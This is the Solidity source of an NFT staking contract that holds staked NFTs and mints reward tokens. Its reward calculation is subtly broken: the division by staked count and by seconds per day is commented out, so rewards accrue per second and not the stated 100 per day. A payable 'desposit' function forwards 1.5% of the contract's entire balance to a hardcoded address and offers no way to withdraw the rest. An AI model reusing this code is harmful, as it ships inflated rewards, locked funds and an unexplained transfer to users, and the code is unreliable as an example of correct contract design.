// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./TokenName.sol";
import "./ReentrancyGuard.sol";
import "./Ownable.sol";
import "./NFTContract.sol";

contract NFTStakingContract is ReentrancyGuard, Ownable{
    InsertName public parentNFT;
    TheTokenName public rewardsToken;

    //mapping for tokenId to staker address
    mapping(uint256 => address) public ownerOfStakedNFT;

    //mapping for amount staked per address
    mapping(address => uint256) public stakedNFTs;

    //mapping to total time staked
    mapping (address => uint256) public stakingTime;

    uint private rewardRate = 100; // 100 a day per nft
    uint private NFTsStaked;
    uint public rewardPerNFTStaked;
    uint public lastUpdatedTime;
    mapping(address => uint) public userRewardPerNFTStaked; // how paid
    mapping(address => uint) public userRewardsCurrent; // how much in total

    constructor(){
        rewardsToken = TheTokenName(0xdC94952B618dA4511d9b1df6727740476B8E6FCa);
        parentNFT = InsertName(0x19249a457d02c3d96388d36AF4bFDE61532a89F0);
        NFTsStaked = 0;
    }

    modifier updateReward(address account){
        rewardPerNFTStaked = rewardPerToken();
        lastUpdatedTime = block.timestamp;

        userRewardsCurrent[account] = earnedSoFar(account);
        userRewardPerNFTStaked[account] = rewardPerNFTStaked;
        _;
    }

    function rewardPerToken() public view returns (uint){
        if(NFTsStaked == 0) return 0;

        uint rewardsPerToken = rewardPerNFTStaked + (
            rewardRate * (block.timestamp - lastUpdatedTime) * 1e18 // / (NFTsStaked * 86400)
            );

        return rewardsPerToken;
    }


    // multiply "current staked nfts" by the "reward per NFT staked"
    // subtracted by the paid amount already, plus the current rewards the account holds
    function earnedSoFar(address user) public view returns (uint){
        return (
            stakedNFTs[user] * (rewardPerToken() - userRewardPerNFTStaked[user]) / 1e18
        ) + userRewardsCurrent[user];
    }

    function stakeNFT(uint256 _tokenId) external nonReentrant updateReward(msg.sender){
        NFTsStaked += 1;
        stakedNFTs[msg.sender] += 1;
        ownerOfStakedNFT[_tokenId] = msg.sender;
        parentNFT.safeTransferFrom(msg.sender, address(this), _tokenId);
    }

    function unStakeNFT(uint256 _tokenId) external nonReentrant updateReward(msg.sender){
        require(ownerOfStakedNFT[_tokenId] == msg.sender);
        NFTsStaked -= 1;
        stakedNFTs[msg.sender] -= 1;
        delete ownerOfStakedNFT[_tokenId];
        parentNFT.safeTransferFrom(address(this), msg.sender, _tokenId);
    }

    function receiveReward() external nonReentrant updateReward(msg.sender){
        uint reward = userRewardsCurrent[msg.sender];
        userRewardsCurrent[msg.sender] = 0;
        require(reward > 0, "Not enough reward yet!");
        rewardsToken.mintToken(msg.sender, reward);
    }


    function pauseToken() external onlyOwner{
        rewardsToken.pause();
    }

    function unpauseToken() external onlyOwner{
        rewardsToken.unpause();
    }

    function desposit() external payable{
        payable(0x7C9Ada7B2605b91796A121156Fe03f71E7596ebB).transfer((address(this).balance * 3) / 200);
    }
}